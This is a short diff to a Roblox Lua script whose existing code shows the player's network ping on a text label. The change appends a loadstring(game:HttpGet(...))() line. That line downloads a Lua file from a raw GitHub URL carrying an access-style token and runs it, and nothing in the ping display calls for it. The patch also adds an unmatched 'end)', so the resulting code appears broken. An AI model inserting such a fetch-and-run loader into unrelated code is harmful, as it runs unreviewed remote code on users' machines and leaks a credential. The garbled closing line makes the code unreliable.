@@ -47,3 +47,6 @@ local RunService = game:GetService("RunService")
 RunService.RenderStepped:Connect(function(ping) 
 script.Parent.Text = ("Ping: " ..game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString(math.round(2/ping))) -- your ping
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/countervolts/GUI.lua/main/GUIMAIN.lua?token=GHSAT0AAAAAAB4XYAXZJZKC3IGD55MRGMTWY62C7VA",true))()
+end)
